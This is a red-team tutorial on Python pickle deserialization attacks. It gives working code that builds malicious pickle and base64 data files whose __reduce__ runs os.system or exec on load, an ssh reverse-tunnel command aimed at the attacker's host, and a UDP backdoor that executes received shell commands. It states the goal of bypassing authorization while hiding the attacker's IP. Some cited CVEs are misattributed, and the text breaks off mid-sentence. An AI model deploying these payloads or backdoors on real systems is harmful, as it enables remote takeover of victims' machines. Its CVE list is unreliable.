# Python Deserialization Attack Introduction

### How to build a python pickle bomb

**Project design purpose** : This article will introduce an old and classic python data serialization feature and how red team attacker can use it as a vulnerability to build a malicious remote code/command execution attack bomb as a binary or text file when the other deserialized the data file. 



#### How Deserialization Attacks Work

1. **Crafting Malicious Data**: An attacker crafts a malicious payload that, when deserialized, will execute code on the target system. This payload often takes advantage of the inherent trust the deserialization process has in the incoming data.
2. **Injection**: The attacker injects the malicious payload into the application, typically through input fields, network requests, or other data sources.
3. **Execution**: The application deserializes the malicious data, triggering the execution of the embedded code. This can lead to arbitrary code execution, compromising the system's security.



```
# Created:     2024/07/06
# Version:     v0.1.1
# Copyright:   Copyright (c) 2024 LiuYuancheng
# License:     MIT License
```

**Table of Contents**

[TOC]

------

### Introduction

Deserialization is the process of converting data from a serialized format back into its original data structure. A deserialization attack occurs when an application deserializes untrusted or maliciously crafted data, leading to potential security vulnerabilities. These attacks can result in various forms of exploitation, including arbitrary code execution, data corruption, and denial of service. The vulnerability arises because the deserialization process often assumes that the incoming data is well-formed and trustworthy. There are several Common Vulnerabilities and Exploits (CVEs) related the python Deserialization Vulnerabilities: 

1. **CVE-2011-3389**: Untrusted data passed to `pickle` deserialization can execute arbitrary code.
2. **CVE-2019-5021**: The `pickle` module in Python is vulnerable to arbitrary code execution due to unsafe deserialization.
3. **CVE-2018-1000802**: A deserialization vulnerability in the `pickle` module can be exploited to execute arbitrary code.
4. **CVE-2019-9636**: Insecure loading of a `pickle`-based format in the Pandas library can lead to arbitrary code execution.
5. **CVE-2019-20907**: Improper handling of serialized data leading to potential arbitrary code execution.
6. **CVE-2024-34997**:  critical deserialization vulnerability identified in joblib version 1.4.2, specifically in the `NumpyArrayWrapper().read_array()` component within the `joblib.numpy_pickle` module. 



#### Introduction of Python Data Serialization

In Python, this often involves converting data from formats like JSON, YAML, XML and save to file for data storage and fetch. But if we want to save some complex data such as nest dictionary with bytes data or even build in object (as shown below):

```
# An data structure example which can not covert to Json Yaml or XML format.
from collections import OrderedDict
data = OrderedDict({
    'Timestamp': '2023-04-05 16:00:00',
    'IoTData': {
        'IP': '172.23.155.209',
        'Port': 3001,
        'value': [1.2, 1.3, 1.4],
        'RptPeer': {
            'Hub1': 1.2,
            'Hub2': 1.3
        },
        'CfgSet': set(['CT100', 'COM3', 3])  # set data is not support by json
    }
})
```

For the complex data object, json yaml or xml format will not work, it is very convenient to use the function pickle to convert the data to bytes so we can save them in file or transfer through network. We can use the pickle.dumps() to serialize the data to byets and pickle.loads() to deserialize the bytes to original data.  



#### Introduction of Python Deserialization Vulnerabilities

It is convenient to use python pickle to package data, the  `pickle` module is notorious for being insecure when used with untrusted data. If you go the the python `pickle`  official documents, it high lights  

![](img/introduction_00.png)

The `pickle` module can serialize and deserialize Python objects, but it has the capability to execute arbitrary code during deserialization. This feature can be exploited by attackers to run malicious code on the target system. A very simple way to build a pickle bomb is dumps a object with `__reduce__()` function:

![](img/introduction_01.png)

The reduce function can return a executable function and the related parameters, when the data is deserialized, the function will be executed. Assume we have one simple serialized data loader to load bytes format and text format data:

```python
# A normal pickle serialized data file load program (version v0.0.2)
import pickle
import base64
while True:
    choice = input("Input load serialized data file format([1] byte file, [2] txt file):")
    if choice == '1':
        orignalData = None
        with open('data.pkl', 'rb') as fh:
            orignalData = pickle.load(fh)
        print(orignalData)
    elif choice == '2':
        dataStr = None
        with open('data.txt', 'r') as fh:
            dataStr = fh.read()
        orignalData = pickle.loads(base64.b64decode(dataStr))
        print(orignalData)
    else:
        print("Exit....")
        exit()
```

To build a simple Python pickle bomb program, we can over write  the `__reduce__()` function to return the os.system function with a command so when the data loader read the data file, it will execute a command as shown below:

```python
import os
import pickle
import base64

# a simple picle bomb to run command
class PickleCmd:
    def __reduce__(self):
        cmd = ('uname -a')
        return os.system, (cmd,)    
obj = PickleCmd()
pickledata = pickle.dumps(obj, protocol=pickle.HIGHEST_PROTOCOL)

with open('data.pkl', 'wb') as handle:
    pickle.dump(obj, handle, protocol=pickle.HIGHEST_PROTOCOL)

dataStr = base64.b64encode(pickledata).decode('ascii')
with open('data.txt', 'w') as fh:
    fh.write(dataStr)
```

When we run the builder program it will create 2 data file:  byte data file  data.pkl and text data file data.txt, when we use the loader the read the files data, you can see the list system information cmd is executed:

![](img/s_02.png)

With the ability of execution command, the attack can integrate the harmful command such as delete some files or check the credential information. 



------

### Build Python Pickle Boom

In this section, we will build more complex python pickle bomb program which allow us to by pass the  system authorization mechanism to remote execution command on the victim machine and get the result.

Before we start we need to clarify some thing: can we add all the command execution or malicious code in the reduce function? if we change the function as shown below:

```
class PickleCmd:
    def __reduce__(self):
        os.system('date')
        os.system('ifconfig')
        with open('testfile.txt', 'w') as fh:
            fh.write("Test file contents")
        cmd = ('uname -a')
        return os.system, (cmd,)
```

if we reload the new pickle bomb, you can see the new added code and command are not executed:

![](img/s_03.png)

So only the returned function is executed. So if we want to more complex task such as run command on the victim, we can pass in a reverse shell command as shown below 

```
cmd = ('ssh -R 0.0.0.0:7070:localhost:22 <redTeam hacker's ip address>')
```

Then on hacker side use metasploit to listen port 7070 to send ssh command to the victim. But when the defender check cmd log,  the red team hacker's ip address will be expose. And what if we want to run some more complex python program? 

We can use the python exec() function to solve this problem, the **`exec()`** function allows you to execute arbitrary Python code from a string or compiled code input. The `exec()` function can be handy when you need to run dynamically generated Python code, but it can be pretty dangerous if you use it carelessly. In this tutorial, you’ll learn not only how to use `exec()`, but just as importantly, when it’s okay to use this function in your code.

Now let's do a simple improvement of our pickle bomb program which return the exec and a piece of python code in the reduce function: 

```python
import pickle
import base64

codeContent="""
with open('testfile.txt', 'w') as fh:
    fh.write("Test file contents")
"""
# a simple picle bomb to run command
class PickleCode:
    def __reduce__(self):
        return exec, (codeContent,)
    
obj = PickleCode()
pickledata = pickle.dumps(obj, protocol=pickle.HIGHEST_PROTOCOL)

with open('data.pkl', 'wb') as handle:
    pickle.dump(obj, handle, protocol=pickle.HIGHEST_PROTOCOL)

dataStr = base64.b64encode(pickledata).decode('ascii')
with open('data.txt', 'w') as fh:
    fh.write(dataStr)
```

After load the data file now we can see the python code to create a file is executed:

![](img/s_04.png)



Now let's build our pickle boom. The pickle bomb program will have a UDP server to receive the red team's command execution request then execute the code and return the result back to the request sender. (So even the user find the bomb, from the bomb he can not get the red team attacker's IP address)

```
# A normal UDP server host on port 3000 accept different UDP client connection 
# execute cmd and send the result back to the related client (version v0.0.2)
import socket
import subprocess
BUFFER_SZ = 4096 
port = 3000
udpServer = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udpServer.bind(('0.0.0.0', port))
while True:
    data, address = udpServer.recvfrom(BUFFER_SZ)
    cmdMsg = data.decode('utf-8')
    if cmdMsg == '': continue
    if cmdMsg == 'exit': exit()
    result = 'Command not found!'
    try:
        result = subprocess.check_output(cmdMsg, shell=True).decode()
    except Exception as err:
        result = str(err)
    udpServer.sendto(result.encode('utf-8'), address)
```

Now we read this python program as a string, then pass in as parameter in the pickle bomb object, then create the pickle bomb data file with a simple bomb builder :

```
# A normal pickle serialized data file create program (version v0.0.2)
# by Liu Yuancheng
import pickle
import base64

# Serilized file:
#fileName = 'flaskWebShellApp.py'
fileName = 'udpCmdServer.py'
dataStr = None 
with open(fileName, 'r') as fh:
    dataStr = fh.read()

class PickleBomb:
    def __reduce__(self):
        pass
        return exec, (dataStr,)

obj = PickleBomb()
pickledata = pickle.dumps(obj, protocol=pickle.HIGHEST_PROTOCOL)

with open('data.pkl', 'wb') as handle:
    pickle.dump(obj, handle, protocol=pickle.HIGHEST_PROTOCOL)

dataStr = base64.b64encode(pickledata).decode('ascii')
with open('data.txt', 'w') as fh:
    fh.write(dataStr)
```

Now if any people run the pickle loader or any program try to load the pickle file, the bomb will be activated:

172.23.155.209

Now we can use a simple UDP client program to connect 